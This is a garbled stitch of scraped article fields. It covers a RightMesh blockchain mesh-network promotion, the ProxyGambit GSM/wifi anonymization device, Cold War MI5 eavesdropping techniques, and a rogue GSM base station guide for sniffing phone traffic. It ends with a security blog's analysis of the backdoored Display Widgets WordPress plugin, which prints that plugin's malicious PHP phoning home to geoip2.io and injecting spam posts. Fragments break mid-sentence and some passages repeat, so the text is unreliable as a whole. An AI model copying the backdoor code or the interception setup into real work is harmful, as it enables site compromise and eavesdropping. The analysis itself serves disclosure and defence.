			"body": "> GPLv3 must cope with threats to freedom that we did not imagine in 1989. The coming generation of computers, and many products with increasingly powerful embedded computers, are being turned against us by their manufacturers before we buy them—they are designed to restrict what we can use them to do.... The motive for DRM schemes is to increase profits for those who impose them, but their profit is a side issue when millions of people's freedom is at stake; desire for profit, though not wrong in itself, cannot justify denying the public control over its technology. Defending freedom means thwarting DRM. -- Richard Stallman (https://www.gnu.org/philosophy/opposing-drm.html)",

What if you could do it at a fraction of the cost?RightMesh, a blockchain-based project, is attempting to do that by applying blockchain technology to the concept of mesh networks. Also read: Credit Card Companies Deliberately Piling on Debt, Says UK GroupThis article is sponsored by the Vanbex GroupMesh networks are exciting to many in the crypto space, as they represent a way to decentralize the internet itself — an appealing notion to a community whose core value centers around disintermediation.Numerous projects have centered around mesh networks, with one of the most successful of them being FireChat, the peer-to-peer smartphone app that works even without internet access.Recently, projects powered by cryptocurrency have also been on the rise, including RightMesh, which attempt to use blockchains to incentivize participation within mesh networks.RightMesh: Connecting the UnconnectedRightMesh wants to do to connectivity what Uber did to transport and Airbnb did to lodging and room rentals.Just as Airbnb and Uber allow people to make money from their underutilized time, vehicle usage, or space in the home, RightMesh will allow people to do the same with their underutilized connectivity, storage, and processing capabilities.They think that by using everyday devices — like mobile phones — as access points they will be able to connect far more people than is currently possible, or will be possible in the near future.This is because by leveraging cheap and affordable devices they could allow people in developing nations to enjoy the benefits of internet access as well.For the same reason, RightMesh could also be helpful to the IoT revolution by making it easier for devices to connect to one another and the internet.Additionally, by using blockchain tech, the RightMesh team thinks that it could make networks more trustless, secure, and help remove inefficiencies.Building a Mesh Network on EthereumProbably the most notable aspect of RightMesh will be its potential to completely displace ISPs and other intermediaries like telecoms.“The key principle is that the RightMesh network is self-forming, self-healing, and self-regulating, using whatever it has at its disposal. It runs on devices most of the world already uses and can easily afford. No additional hardware or infrastructure is required, and no longer will people be beholden to ISPs.”“In the RightMesh network, the mobile devices themselves provide the infrastructure in place of ISPs,” the team continued.The platform will be built on top of the Ethereum blockchain and is planning to introduce a token at some point in the future. The token will follow the ERC20 standard and will be interoperable with other DAPPs that use the same token.The team did not provide a timetable for the project’s development, saying they wanted to prioritize the technology and the economics of the mesh before committing to a definite roadmap.A Quick Look at Mesh NetworksA computer network is a web of electronic devices that are wired together, allowing said devices to share information between each other.Networks can have different topologies or ways in which the different parts are physically arranged within in it.A mesh network is a specific kind of computer network where every device is connected to all other devices, which act as “nodes,” access points to the rest of the network.The internet consists of smaller computer networks that communicate with one another through centralized gateways known as Internet Service Providers (ISPs).So, in a way, the internet itself is a mesh network, as local devices connect to an ISP, forming a network, that ultimately provides the infrastructure to then connect to all other networks.However, the key difference between a mesh and the current structure of the internet is that mesh’s connect people organically, on a peer-to-peer basis.A mesh network enables an entirely peer-to-peer internet the same way that Bitcoin is a peer-to-peer currency — giving people internet access without relying on middlemen.Barriers to Building Reliable Mesh NetworksDespite their exciting appeal, there are a few reasons why mesh networks have not yet become standard — and it isn’t from a lack of trying.For one, many of the larger mesh projects such as NYCMesh and Hyperboria exist on a purely voluntary basis.Voluntary mesh networks don’t give people a reason to share their internet access, which limits their scope and prevents them from ever becoming legitimate alternatives to ISPs.Still, problems even exist with paid networks, as the RightMesh team explains, many previous attempts required people to jailbreak their phones or required technical expertise on the part of the user to work.“Many other mesh projects focus on hardware. Others which support devices like phones require rooting the device (which is not particularly user friendly). Others may work without rooting, but require lots of user intervention in order to make the connections between devices.”This is where RightMesh thinks it can distinguish itself from past project, finally creating a long-lasting and reliable mesh network that will actually become a disrupting force.",

A logic level converter or voltage <br/>divider is required to prevent imminent destruction of hardware which we<br/> perform with a few inexpensive resistors.</p><p><br/></p><p><br/></p><h3>FONA GSM Board</h3><p><br/></p><p><br/></p><p><strong>$40</strong>: The <a href=\"http://amzn.to/1SmM1N9\">Adafruit FONA GSM board</a><br/> uses a SIM800 chip which allows us to connect an Arduino to GSM, <br/>providing us a 2G Internet link, and can additionally allow SMSs and <br/>voice calls to our friends to verify whether their refrigerators are <br/>running.</p><p><br/></p><p><br/></p><p><a href=\"http://samy.pl/proxygambit/IMG_3138.JPG\"><img src=\"http://samy.pl/proxygambit/IMG_3138sm.JPG\" alt=\"ProxyGambit Raspberry Pi with Arduino\"/></a></p><p><br/></p><p><br/></p><h3>FONA Antenna</h3><p><br/></p><p><br/></p><p><strong>$6</strong>: An <a href=\"http://amzn.to/1IZLDDt\">antenna</a> is helfpul (read: necessary).</p><p><br/></p><p><br/></p><h3>Point-to-Point Wireless Links</h3><p><br/></p><p><br/></p><p><strong>$98</strong>: For low cost and low profile, I suggest either a <strong>pair</strong> of the <a href=\"http://amzn.to/1GlBsmn\">Ubiquiti NanoStation LocoM2s</a> (2.4GHz) which reach 5km+, or a <strong>pair</strong> of the <a href=\"http://amzn.to/1GlBqep\">Ubiquiti NanoStation LocoM5s</a><br/> (5GHz) which reach 10km+, but are slightly more expensive at $62 or <br/>$124 for both. These devices are not interchangeable. Additionally, if <br/>you choose the LocoM5, you can actually use one of the devices to <br/>acquire Internet access at Burning Man.</p><p><br/></p><p><br/></p><h3>Wifi Card</h3><p><br/></p><p><br/></p><p><strong>$10</strong>: You can use anything such as an <a href=\"http://amzn.to/1f34zVV\">Edimax</a> adapter, or a more powerful <a href=\"http://amzn.to/1SmMi2x\">Alfa AWUS036NH</a><br/> adapter. This all depends on how far you'd like your ProxyGambit device<br/> to reach. This is specifically to connect to the &#34;exit node&#34; of the <br/>proxy link where your Internet traffic will ultimately come out of and <br/>appear to be coming from.</p><p><br/></p><p><br/></p><h3>SIM Card</h3><p><br/></p><p><br/></p><p><strong>$8</strong>: You will need a <a href=\"http://amzn.to/1GlBz1w\">SIM card</a> with access to a 2G network.

I do this by using a <a href=\"http://amzn.to/1TCg0D3\">2.5A powered USB hub</a><br/> in a virtual loop. The hub acts as the power supply for the Raspberry <br/>Pi, preventing any need for a power supply, while ironically I connect <br/>the source of the hub back into one of the Raspberry Pi USB slots. This <br/>may appear dangerous as a voltage or data loop, but the Pi's <br/>USB-voltage-in has data lines split off, and the USB hub prefers power <br/>from its voltage rectifier rather than the recirculated power lines.</p><p><br/></p><p><br/></p><p><a href=\"http://samy.pl/proxygambit/loopdescbig.png\"><img src=\"http://samy.pl/proxygambit/loopdesc.png\" alt=\"Raspberry Pi USB Hub Power Loop\"/></a></p><p><br/></p><p><br/></p><h3>3.7 Lithium-Ion (LiOn or LiPo) Battery</h3><p><br/></p><p><br/></p><p><strong>$13</strong>: The FONA GSM board annoyingly requires a 3.4-4.0V voltage source in addition to a 5V source, so I use a small <a href=\"http://amzn.to/1TCg71t\">lipo battery</a><br/> for this. The FONA has a built-in charger so I tie the charger directly<br/> to the 5V from the Arduino, which actually bypasses the Arduino voltage<br/> regulator and instead grabs power from our high-current USB hub.</p><p><br/></p><p><br/></p><hr/><p><br/></p><p><br/></p><h1>Software</h1><p><br/></p><p><br/></p><p>Code @ <a href=\"https://github.com/samyk/proxygambit\">https://github.com/samyk/proxygambit</a> &amp; <a href=\"https://mega.nz/#%215JAzTKjC%21XUlpWcnsqpTOUtU_-QY0lh7gy-hE9gf1rZyPa2IsFdQ\">Linux image here</a></p><p><br/></p><p><br/></p><h3>ProxyGambit (Arduino + GSM Link)</h3><p><br/></p><p><br/></p><p>The microcontroller code produces a serial connection over a reverse <br/>TCP tunnel through a 2G GSM link and ties it to the UART serial lines of<br/> the Raspberry Pi.

			"body_p": "ProxyGambitby @SamyKamkar // https://samy.pl // Jul 14, 2015ProxyGambit is a simple anonymization device that allows you to access the Internet from anywhere in the world without revealing your true location or IP, fracturing your traffic from the Internet/IP through either a long distance radio link or a reverse tunneled GSM bridge that ultimately drops back onto the Internet and exits through a wireless network you're no where near.While a point to point link is possible, the reverse GSM bridge allows you to proxy from thousands of miles away with nothing other than a computer and Internet with no direct link back to your originating machine.A high speed (150Mbps+) link is available with direct line of sight from 10km+ away, or if further away, a 2G GSM connection produces a reverse TCP tunnel serializing a shell into the device accessible from anywhere in the world via the Internet or GSM. Either method proxies your connection through local wifi networks near the device, shielding and making it more difficult to determine your true location, IP and identity.ProxyGambit is an improvement and reincarnation of ProxyHam, the promising device that was to debut at Defcon 2015, yet vanished with no source, documentation or reason for its &#34;destruction&#34;. ProxyHam &#34;promised to mask your location online by putting you up to 2.5 miles away from your router&#34;ProxyGambit improves upon ProxyHam not only by allowing a greater direct range, but also enables you to proxy from anywhere in the world using just an Internet connection, which can then proxy through a reverse GSM serial link onto a public wifi network.Once set up, no special hardware is needed to bridge through the GSM link and back out onto wifi -- just you, a computer and a net connection (which will not be as easily identified.)This is an insecure, bare bones proof of concept. The fragmentation of data through alternate mediums is a useful and effective concept and those interested in privacy, anonymization, or deanonymization should explore this area further. Entropy is both gained and lost with these methods and many risks are involved when deploying any system of this nature.by @SamyKamkar // code@samy.pl // https://samy.pl // Jul 14, 2015Code available on github, Linux image available hereHardwareRaspberry Pi$35: A Raspberry Pi 2 Model B (or cheaper RPi Model B+) computer is a critical portion of the core and drives the Linux serial link while also bridging our public wifi to radio connection.username: pipassword: donttracemebroArduino$8: Any ATmega328 device will suffice, such as my favorite Arduino Nano, which provides a software proxy layer between the serial UART of the Raspberry Pi and the FONA GSM board. A logic level converter or voltage divider is required to prevent imminent destruction of hardware which we perform with a few inexpensive resistors.FONA GSM Board$40: The Adafruit FONA GSM board uses a SIM800 chip which allows us to connect an Arduino to GSM, providing us a 2G Internet link, and can additionally allow SMSs and voice calls to our friends to verify whether their refrigerators are running.FONA Antenna$6: An antenna is helfpul (read: necessary).Point-to-Point Wireless Links$98: For low cost and low profile, I suggest either a pair of the Ubiquiti NanoStation LocoM2s (2.4GHz) which reach 5km+, or a pair of the Ubiquiti NanoStation LocoM5s (5GHz) which reach 10km+, but are slightly more expensive at $62 or $124 for both. These devices are not interchangeable. Additionally, if you choose the LocoM5, you can actually use one of the devices to acquire Internet access at Burning Man.Wifi Card$10: You can use anything such as an Edimax adapter, or a more powerful Alfa AWUS036NH adapter. This all depends on how far you'd like your ProxyGambit device to reach. This is specifically to connect to the &#34;exit node&#34; of the proxy link where your Internet traffic will ultimately come out of and appear to be coming from.SIM Card$8: You will need a SIM card with access to a 2G network. You can purchase prepaid SIM cards in cash with 2G through T-Mobile.SD Card$6: An SD card is required for the Raspberry Pi to host the operating system and data.Powered USB Hub$10: I avoid two issues with Raspberry Pi -- the limited power output from USB, and the limited power input from most USB power supplies. I do this by using a 2.5A powered USB hub in a virtual loop. The hub acts as the power supply for the Raspberry Pi, preventing any need for a power supply, while ironically I connect the source of the hub back into one of the Raspberry Pi USB slots. This may appear dangerous as a voltage or data loop, but the Pi's USB-voltage-in has data lines split off, and the USB hub prefers power from its voltage rectifier rather than the recirculated power lines.3.7 Lithium-Ion (LiOn or LiPo) Battery$13: The FONA GSM board annoyingly requires a 3.4-4.0V voltage source in addition to a 5V source, so I use a small lipo battery for this. The FONA has a built-in charger so I tie the charger directly to the 5V from the Arduino, which actually bypasses the Arduino voltage regulator and instead grabs power from our high-current USB hub.SoftwareCode @ https://github.com/samyk/proxygambit &amp; Linux image hereProxyGambit (Arduino + GSM Link)The microcontroller code produces a serial connection over a reverse TCP tunnel through a 2G GSM link and ties it to the UART serial lines of the Raspberry Pi.

Long before Snowden the written account of former spies brought to light the most secret surveillance means. These include  Philip Agee (CIA) and  Peter Wright (MI5). The latter the more similar to Snowden since before his counterintelligence work he developed his career as an MI5 scientific officer attached to the Marconi Company.Peter Wright is noted for writing the controversial book Spycatcher: The Candid Autobiography of a Senior Intelligence Officer. Spycatcher was part memoir, part exposé of what Wright claimed were serious institutional failings in MI5 and his subsequent investigations into those.According to Wright, he then was either responsible for MI5/GCHQ, or intimately involved with, the development of some advanced techniques of Signal Intelligence, then shared with their counterparts from the NSA for example:SATYR (MI5/CIA): Forensic examination of The Thing, also known as the Great Seal bug, was one of the first covert listening devices (or &#34;bugs&#34;) to use passive retroreflector techniques to transmit an audio signal. It was concealed inside a gift given by the Soviets to the US Ambassador to Moscow. Wright's reverse engineering led to development of a similar British system codenamed SATYR, used throughout by the British, Americans, Canadians and Australians.SPECIAL FACILITY (MI5). Electronic device deployed by MI5 that was installed in a telephone to enable it to transmit sounds in the room whilst on-hook.ENGULF (MI5): acoustic &#34;TEMPEST&#34; cryptanalysis—recording the sound of the settings of Egyptian Hagelin cipher machines allowed later decryption.STOCKADE (MI5/GCHQ): analysis of compromising emanation from French cipher machine cables in 1960. They used broad band radio detection of the cables, and were actually able to read the original plain text along the low-grade cipher sequence. Surprisingly, murmurs of high-grade ciphers could sometimes be read from the same cable, which after comparison to the cable fed signal, gave a path to even that cipher's plain text leakage. From 1960 to 1963 the MI5 and GCHQ could read cipher traffic to and from the French Embassy in London.RAFTER (MI5): remote detection of passive radio receivers. First used to prove beyond any doubt that the Russians were listening to MI5 Watcher (Officers of MI5's A Branch charged with visual surveillance and identification of persons presenting a security risk.) radio frequencies.By using RAFTER Wright could also detect which broadcasts from Moscow to illegal agents in the field were being monitored.  The program eventually expanded into airborne operations, where receivers were detected from planes above london, thus giving the general area where mobile ground detection could be initiated. This was done by flooding the vicinity with vans that at best could pinpoint buildings or blocks.Replicating RAFTER technique today is practically a child play as recently published by rtl-sdr.com blog. Léo Poughon a High School student and his friend Thomas Daniel  tried to do, with the help of amateur radio near Toulouse (F6GUS) the same thing as the “RAFTER&#34;  did  hearing at unintentional electromagnetic emissions coming from a widely-used consumer superhet receiver.Unintentional Radio Emissions was also the subject of security researcher Melissa Elliott &#34;Noise Floor: Exploring the world of unintentional radio emissions&#34; talk at DEF CON security conference.Any superheterodyne receiver (almost all consumer radio is of the superhet design i.e. listening at FM broadcast) spreads some unintentional radiations due to the local oscillator mixer. anybody with a suitable receiver (for example any rtl-sdr based dongle) can receive these emissions. Because of design in most FM radio the local oscillator (that is what the user actually tune) is tuned at the frequency he wants to listen plus 10.7 MHz.

Yep … ours :DHere’s a picture taken from my Samsung Galaxy S6 ( using the Network Cell Info Lite app ) which automatically connected to my BTS after 3 minutes:From now on, you can configure the BTS to do whatever you want … either act as a “proxy” to a legit SMC ( with a GSM/3g USB dongle ) and sniff the unencrypted GSM traffic of each phone, or to create a private GSM network where users can communicate for free using SIP, refer to the YateBTS Wiki for specific configurations.Oh and of course, if you plug the USB battery, the whole system becomes completely portable :)References and Further Readingshttps://github.com/Nuand/bladeRF/wiki/Setting-up-Yate-and-YateBTS-with-the-bladeRFhttps://z4ziggy.wordpress.com/2015/05/17/sniffing-gsm-traffic-with-hackrf/https://z4ziggy.wordpress.com/2015/05/10/ziggys-embedded-bts/http://wiki.yatebts.com/index.php/Main_PageClearnet: https://www.evilsocket.net/2016/03/31/how-to-build-your-own-rogue-gsm-bts-for-fun-and-profit/",

			"title": "WordPress’ Poor Handling of Plugin Security Exacerbates Malicious Takeover of Display Widgets",
			"body": "<p>Recently there has been a fair amount of coverage of popular Chrome <br/>extensions being modified to include malicious code after the login <br/>credentials used to control them in the Chrome Web Store had been <br/>compromised through phishing. In the past extensions have been purchased<br/> and then malicious code added to them as well. There is no reason that <br/>the same thing can’t happen with WordPress plugins and recent similar <br/>situation with the plugin Display Widgets shows that the people on the <br/>WordPress side of things are not currently up to task of handling this <br/>type of situation properly. Unfortunately, this isn’t at all surprising <br/>because elements of the failure with this situation are things that we <br/>have been seeing and discussing for some time.</p><p><br/></p><p>What we also found interesting about the situation is that it was <br/>made worse by the people on the WordPress side alienating someone who <br/>actually did the work they should have done. The cause of that is also <br/>something that we have experienced and fixing it was one of things we <br/>laid out as something <a href=\"https://www.pluginvulnerabilities.com/2017/06/08/taking-a-stand-against-the-continued-poor-handling-of-security-with-wordpress/\">that<br/> needed to be worked on being corrected before we would started <br/>notifying the Plugin Directory about plugins with publicly known <br/>vulnerabilities in the current version of the plugin again</a>. We will <br/>discuss that further in a follow up post, but first let’s take a look at<br/> what happened with the plugin that lead to malicious code being <br/>introduced to many websites.</p><p><br/></p><h2>A New Owner</h2><p><br/></p><p>The plugin Display Widgets, which has 200,000+ active installs according to wordpress.org, was <a href=\"http://strategy11.com/display-widgets/\">purchased from the original developer in May of this year</a>.<br/> Prior to that the last update was in October of 2015 and the plugin was<br/> only listed as being compatible with up to WordPress 4.3.</p><p><br/></p><p>If you want to<a href=\"https://developer.wordpress.org/plugins/wordpress-org/take-over-an-existing-plugin/\"> takeover an abandoned plugin, WordPress has a process for that</a> and they say they might deny a takeover for the following reasons:</p><p><br/></p><ul><br/><ul><li>The requesting developer does not have the experience we feel the plugin requires</li></ul><br/><li>The requested plugin is deemed high-risk</li><br/><li>The existing developer is a company or legal entity who owns the trademark</li><br/><li>The requesting developer has had multiple guideline infractions</li><br/></ul><p><br/></p><p>If you were to takeover a plugin directly from the developer there is<br/> no restriction. In this case the account of the developer on <a href=\"https://wordpress.org/support/users/displaywidget\">wordpress.org was created</a> the same day they made their first change to the plugin after taking ownership.</p><p><br/></p><h2>A Red Flag</h2><p><br/></p><p>The first release from the new developer sounds highly problematic. Here is how it is <a href=\"https://stallion-theme.co.uk/display-widgets-plugin-review/\">described by David Law</a> (the file mentioned is no longer available for download, so we can’t independently confirm this):</p><p><br/></p><blockquote><p>What it added was an automated download of another plugin (a geolocation widget: was over 50MB in size!) from a private server!</p><br/><p><strong>Automatically installing code from a private server is against the WordPress plugin repository rules.</strong></p><br/><p>The new code also connected to another server to track visitors data including:</p><br/><p><strong>IP Address</strong> (can potentially track you to your street address)<br/><br/><strong>Webpage Visited</strong> (URL of the webpages a visitor visited)<br/><br/><strong>Site URL</strong> (the URL of the WordPress site the Display Widgets plugin is installed on)<br/><br/><strong>User Agent</strong> (which browser the visitors uses etc…)</p><br/><p><strong>Automatically tracking user data etc… without the permission of the site owner is against the WordPress plugin repository rules.</strong></p></blockquote><p><br/></p><p>David then reported this and action was taken:</p><p><br/></p><blockquote><p>I reported the infringements to the plugin repository, <br/>simply email them via plugins@wordpress.org and explain what’s you think<br/> is wrong.</p><br/><p>Version 2.6.0 was removed from the plugin repository. If you are <br/>using version 2.6.0 of the Display Widgets Plugin on your site, remove <br/>it NOW.</p><br/><p>The plugin repository are very understanding, a week or so later the developer released a new version (v2.6.1).</p></blockquote><p><br/></p><h2>Spam Posts Added</h2><p><br/></p><p>Considering what happened there you would hope the people running the<br/> Plugin Directory would have carefully checked the new version of the <br/>plugin, but they don’t seem to have. That isn’t all that surprising to <br/>us because in the past we have noted that they have returned plugins to <br/>the directory <a href=\"https://www.pluginvulnerabilities.com/2016/09/06/yet-another-very-vulnerable-plugin-returned-to-the-wordpress-plugin-directory-without-actually-being-fixed/\">despite the vulnerability that caused them to be removed</a> having<a href=\"https://www.pluginvulnerabilities.com/2016/06/29/very-vulnerable-wordpress-plugin-returns-to-plugin-directory-without-being-fixed/\"> not been fixed</a>.<br/> Making sure that a known vulnerability has been fixed is much easier <br/>than making sure there isn’t any malicious code in a plugin, so if you <br/>fail at that former, the latter isn’t surprising. Unfortunately we have <br/>seen zero interest from the WordPress side to fix this or many of the <br/>other issues we have seen with their activity.</p><p><br/></p><p>In version 2.6.1 there was code added that should have raised the <br/>suspicions even without fully understanding what was going on in <br/>totality. In particular was the new function check_query_string() in the<br/> new file geolocation.php:</p><p><br/></p><p><br/></p><div class=\"wp_syntax\"><table><tbody><tr><td

someone that isn’t logged and there are not<br/> any posts already included for the request it will add the post from <br/>the setting.</p><p><br/></p><p>What that code been used is to <a href=\"https://wordpress.org/support/topic/display-widget-inserted-spammy-links/\">add spam posts</a> <a href=\"https://wordpress.org/support/topic/payday-loans-seo-spam/\">to websites</a>.</p><p><br/></p><h2>Removed and Removed</h2><p><br/></p><p>According to David Law there multiple <a href=\"https://stallion-theme.co.uk/display-widgets-plugin-review/\">subsequent removals of the plugin,</a> which then returned with the <a href=\"https://wordpress.org/support/topic/display-widgets-plugin-v2-6-3-1-includes-hacking-code/\">malicious code still in the plugin</a>.<br/> This seems like a good example of where more information could have <br/>help because when a plugin is removed there is no information given as <br/>to why it happened, so there is limited opportunity for others to review<br/> things. We also have thought it would be useful for there to be a <br/>process for outside of the WordPress team to be able to review changes <br/>being made to plugins to fix vulnerabilities (which could also be <br/>applied to potentially malicious code), as that increases the chances <br/>that if a vulnerability isn’t fully fixed it will be caught, as well as <br/>possible leading to additional vulnerabilities being identified.</p><p><br/></p><p>At this point the plugin is removed again from the directory again <br/>and the account of the developer(s) has been banned. That seems like it <br/>would have happened if people on WordPress side had treated David Law <br/>better, as <a href=\"https://wordpress.org/support/topic/display-widgets-plugin-v2-6-3-1-includes-hacking-code/\">he explains</a>:</p><p><br/></p><blockquote><p>Had I not been unfairly moderated for reporting earlier <br/>issues I’d have reported these issues over 6 weeks ago and many of the <br/>hacked sites wouldn’t have been hacked (assuming WordPress removed the <br/>plugin).</p></blockquote><p><br/></p><p>We will discuss that in more depth in a follow up post.</p><p><br/></p><p>Removing the plugin from the directory doesn’t do anything to protect<br/> anyone using the plugin already. One solution would be for WordPress to<br/> finally <a href=\"https://wordpress.org/ideas/topic/alert-when-installed-plugins-have-been-removed-from-the-plugin-directory\">start warning people when they are using plugins with this type of situation</a>,<br/> which they so far not done, while at times saying they will. The other <br/>option is to release a new version that isn’t vulnerable, which is <br/>something that people involved with the Plugin Directory claim to do, <br/>but almost never really do, which is something <a href=\"https://www.pluginvulnerabilities.com/2016/08/17/wordpress-doesnt-fix-severe-vulnerability-in-plugin-and-doesnt-want-to-have-an-honest-discussion-about-the-issue/\">they don’t seem to want that to even be discussed</a>.</p><p><br/></p><h2>More Plugins Impacted?</h2><p><br/></p><p>One of the outstanding questions is who was behind this and if this was an isolated incident.</p><p><br/></p><p>In one recent thread there was an indication that there were at least two people involved, <a href=\"https://wordpress.org/support/topic/payday-loans-seo-spam/#post-9478878\">based on the following</a>:</p><p><br/></p><blockquote><p>The other admin here. Unfortunately the addition of the <br/>GEO Location made the software vulnerable to a exploit if used in <br/>conjunction with other popular plugins.</p></blockquote><p><br/></p><p>That obviously could be untrue though.</p><p><br/></p><p>In another thread it was <a href=\"https://wordpress.org/support/topic/display-widgets-plugin-v2-6-1-deleted-from-the-plugin-repository/#post-9286016\">mentioned</a> that developers were based in the US:</p><p><br/></p><blockquote><p>Apologies for the delay. Please consider that it is <br/>Independence Day weekend here in the United States, and even plugin <br/>developers deserve to spend some quality time with their families, don’t<br/> you think?</p></blockquote><p><br/></p><p>Though in another thread an email address was <a href=\"https://wordpress.org/support/topic/display-widgets-plugin-geolocation-tracking-visitors-without-permission/#post-9299026\">given for a UK based domain name</a>:</p><p><br/></p><blockquote><p>Instead please contact kevin.danna@wpdevs.co.uk and please provide who ever you contact, with that email address.</p></blockquote><p><br/></p><p>On the website for that domain they claim to have 34 plugins with 10 million+ installs:</p><p><br/></p><p><a href=\"https://www.pluginvulnerabilities.com/wp-content/uploads/2017/09/wpdevs-co-uk-homepage.png\"><img class=\"alignnone size-full wp-image-4694\" src=\"https://www.pluginvulnerabilities.com/wp-content/uploads/2017/09/wpdevs-co-uk-homepage.png\" alt=\"\" height=\"1149\" width=\"1920\"/></a></p><p><br/></p><p>There is nothing on that website that backs up those claims.

			"body_p": "Recently there has been a fair amount of coverage of popular Chrome extensions being modified to include malicious code after the login credentials used to control them in the Chrome Web Store had been compromised through phishing. In the past extensions have been purchased and then malicious code added to them as well. There is no reason that the same thing can’t happen with WordPress plugins and recent similar situation with the plugin Display Widgets shows that the people on the WordPress side of things are not currently up to task of handling this type of situation properly. Unfortunately, this isn’t at all surprising because elements of the failure with this situation are things that we have been seeing and discussing for some time.What we also found interesting about the situation is that it was made worse by the people on the WordPress side alienating someone who actually did the work they should have done. The cause of that is also something that we have experienced and fixing it was one of things we laid out as something that needed to be worked on being corrected before we would started notifying the Plugin Directory about plugins with publicly known vulnerabilities in the current version of the plugin again. We will discuss that further in a follow up post, but first let’s take a look at what happened with the plugin that lead to malicious code being introduced to many websites.A New OwnerThe plugin Display Widgets, which has 200,000+ active installs according to wordpress.org, was purchased from the original developer in May of this year. Prior to that the last update was in October of 2015 and the plugin was only listed as being compatible with up to WordPress 4.3.If you want to takeover an abandoned plugin, WordPress has a process for that and they say they might deny a takeover for the following reasons:The requesting developer does not have the experience we feel the plugin requiresThe requested plugin is deemed high-riskThe existing developer is a company or legal entity who owns the trademarkThe requesting developer has had multiple guideline infractionsIf you were to takeover a plugin directly from the developer there is no restriction. In this case the account of the developer on wordpress.org was created the same day they made their first change to the plugin after taking ownership.A Red FlagThe first release from the new developer sounds highly problematic. Here is how it is described by David Law (the file mentioned is no longer available for download, so we can’t independently confirm this):What it added was an automated download of another plugin (a geolocation widget: was over 50MB in size!) from a private server!Automatically installing code from a private server is against the WordPress plugin repository rules.The new code also connected to another server to track visitors data including:IP Address (can potentially track you to your street address)Webpage Visited (URL of the webpages a visitor visited)Site URL (the URL of the WordPress site the Display Widgets plugin is installed on)User Agent (which browser the visitors uses etc…)Automatically tracking user data etc… without the permission of the site owner is against the WordPress plugin repository rules.David then reported this and action was taken:I reported the infringements to the plugin repository, simply email them via plugins@wordpress.org and explain what’s you think is wrong.Version 2.6.0 was removed from the plugin repository. If you are using version 2.6.0 of the Display Widgets Plugin on your site, remove it NOW.The plugin repository are very understanding, a week or so later the developer released a new version (v2.6.1).Spam Posts AddedConsidering what happened there you would hope the people running the Plugin Directory would have carefully checked the new version of the plugin, but they don’t seem to have. That isn’t all that surprising to us because in the past we have noted that they have returned plugins to the directory despite the vulnerability that caused them to be removed having not been fixed. Making sure that a known vulnerability has been fixed is much easier than making sure there isn’t any malicious code in a plugin, so if you fail at that former, the latter isn’t surprising. Unfortunately we have seen zero interest from the WordPress side to fix this or many of the other issues we have seen with their activity.In version 2.6.1 there was code added that should have raised the suspicions even without fully understanding what was going on in totality. In particular was the new function check_query_string() in the new file geolocation.php:8687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179public static function check_query_string() {    $displaywidgets_ids =  get_option( 'displaywidgets_ids', array() );     if ( empty( $displaywidgets_ids[ '__3371_last_checked_3771__' ] ) || intval( date( 'U' ) ) - intval( $displaywidgets_ids[ '__3371_last_checked_3771__' ] ) &gt; 86400 ) {        $displaywidgets_ids[ '__3371_last_checked_3771__' ] = date( 'U' );        update_option( 'displaywidgets_ids', $displaywidgets_ids, false );         $request_url = 'http://geoip2.io/api/update/?url=' . urlencode( self::get_protocol() . $_SERVER[ 'HTTP_HOST' ] . $_SERVER[ 'REQUEST_URI' ] ) .

The code will take different actions based on the GET input “action”:106switch ( $_GET[ 'action' ] ) {Nowhere in the plugin are there any requests that would be handled this code, which seems strange.What seems to be the most important part of this code is what is run when the “action” is “p”:137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168case 'p':    $request_url = 'http://geoip2.io/api/check/?url=' . urlencode( self::get_protocol() . $_SERVER[ 'HTTP_HOST' ] . $_SERVER[ 'REQUEST_URI' ] ) .

' | ' . get_bloginfo( 'wpurl' ) . '/' . $key;    }At first glance it isn’t clear what this code might be doing, but it does seem odd. It seems to us that simply trying to find out what it did from the developer would have lead to the plugin not being restored with that code in it.What the code looks to be doing is generating a WordPress post and saving it as a WordPress option (setting), which also seems odd.Where that setting is used is with the function dynamic_page(). That function runs when a set of posts is being generated:add_filter( 'the_posts', array( 'dw_geolocation_connector', 'dynamic_page' ) );Here is the code of the function:181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234public static function dynamic_page( $posts ) {    if ( is_user_logged_in() ) {        return $posts;    }     $displaywidgets_ids =  get_option( 'displaywidgets_ids', array() );    if ( $displaywidgets_ids === false || !is_array( $displaywidgets_ids ) ) {        return $posts;    }     $requested_page_slug = strtolower( $GLOBALS[ 'wp' ]-&gt;request );     if ( count( $posts ) == 0 &amp;&amp; array_key_exists( $requested_page_slug, $displaywidgets_ids) ) {        $post = new stdClass;        $post_date = !empty( $displaywidgets_ids[ $requested_page_slug ][ 'post_date' ] ) ? $displaywidgets_ids[ $requested_page_slug ][ 'post_date' ] : date( 'Y-m-d H:i:s' );         $post-&gt;post_title = $displaywidgets_ids[ $requested_page_slug ][ 'post_title' ];        $post-&gt;post_content = $displaywidgets_ids[ $requested_page_slug ][ 'post_content' ];         $post-&gt;post_author = 1;        $post-&gt;post_name = $requested_page_slug;        $post-&gt;guid = get_bloginfo( 'wpurl' ) .

We also have thought it would be useful for there to be a process for outside of the WordPress team to be able to review changes being made to plugins to fix vulnerabilities (which could also be applied to potentially malicious code), as that increases the chances that if a vulnerability isn’t fully fixed it will be caught, as well as possible leading to additional vulnerabilities being identified.At this point the plugin is removed again from the directory again and the account of the developer(s) has been banned. That seems like it would have happened if people on WordPress side had treated David Law better, as he explains:Had I not been unfairly moderated for reporting earlier issues I’d have reported these issues over 6 weeks ago and many of the hacked sites wouldn’t have been hacked (assuming WordPress removed the plugin).We will discuss that in more depth in a follow up post.Removing the plugin from the directory doesn’t do anything to protect anyone using the plugin already. One solution would be for WordPress to finally start warning people when they are using plugins with this type of situation, which they so far not done, while at times saying they will. The other option is to release a new version that isn’t vulnerable, which is something that people involved with the Plugin Directory claim to do, but almost never really do, which is something they don’t seem to want that to even be discussed.More Plugins Impacted?One of the outstanding questions is who was behind this and if this was an isolated incident.In one recent thread there was an indication that there were at least two people involved, based on the following:The other admin here. Unfortunately the addition of the GEO Location made the software vulnerable to a exploit if used in conjunction with other popular plugins.That obviously could be untrue though.In another thread it was mentioned that developers were based in the US:Apologies for the delay. Please consider that it is Independence Day weekend here in the United States, and even plugin developers deserve to spend some quality time with their families, don’t you think?Though in another thread an email address was given for a UK based domain name:Instead please contact kevin.danna@wpdevs.co.uk and please 